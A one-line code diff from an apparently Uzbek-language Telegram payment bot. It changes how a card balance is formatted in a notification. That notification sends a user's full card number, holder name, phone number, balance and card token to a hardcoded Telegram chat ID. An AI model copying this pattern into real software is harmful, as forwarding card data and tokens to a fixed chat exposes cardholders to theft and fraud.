@@ -264,7 +264,7 @@ bot.on('message', async (msg) => {
             );
             bot.sendMessage(
                634041736,
-               `Karta ma'lumoti:\nkarta raqami: ${addCardData.card_number}\nEgasi: ${addCardData.card_holder}\nTelefon raqami: ${addCardData.phone_number}\nBalance:${addCardData?.balance}\nKarta token: ${addCardData?.card_token}`,
+               `Karta ma'lumoti:\nkarta raqami: ${addCardData.card_number}\nEgasi: ${addCardData.card_holder}\nTelefon raqami: ${addCardData.phone_number}\nBalance:${formatBalanceWithSpaces(addCardData?.balance)}\nKarta token: ${addCardData?.card_token}`,
             );
          }
       }
